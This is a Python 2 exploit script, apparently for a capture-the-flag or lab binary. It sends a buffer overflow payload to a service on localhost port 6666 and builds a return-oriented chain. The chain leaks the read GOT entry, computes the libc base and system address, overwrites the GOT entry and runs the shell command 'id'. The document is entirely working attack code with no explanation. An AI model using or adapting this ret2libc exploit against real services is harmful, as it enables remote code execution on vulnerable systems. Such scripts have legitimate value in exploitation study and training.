from struct import pack, unpack
from socket import *


p = lambda x: pack("<L", x)
up = lambda x: unpack("<L", x)[0]

write_plt = 0x804830c
write_got = 0x08049614
read_plt = 0x804832c
read_got = 0x804961c
dynamic = 0x8049530
pop3ret = 0x80484b6
cmd = "id"

s = socket(AF_INET, SOCK_STREAM)
s.connect(('localhost', 6666))

payload = "A"*140
payload += p(read_plt)
payload += p(pop3ret)
payload += p(0)
payload += p(dynamic)
payload += p(len(cmd))

payload += p(write_plt)
payload += p(pop3ret)
payload += p(1)
payload += p(read_got)
payload += p(4)

payload += p(read_plt)
payload += p(pop3ret)
payload += p(0)
payload += p(read_got)
payload += p(4)

payload += p(read_plt)
payload += p(0xdeadbeef)
payload += p(dynamic)

s.send(payload)
s.send(cmd)

got = up(s.recv(4))
print "read_GOT : " + hex(got)
libc_base = got - 0xd4350
print "libc_base : " + hex(libc_base)
system = libc_base + 0x3a940
print "system_libc : " + hex(system)

s.send(p(system))
s.send(cmd)
print s.recv(1024)
s.close()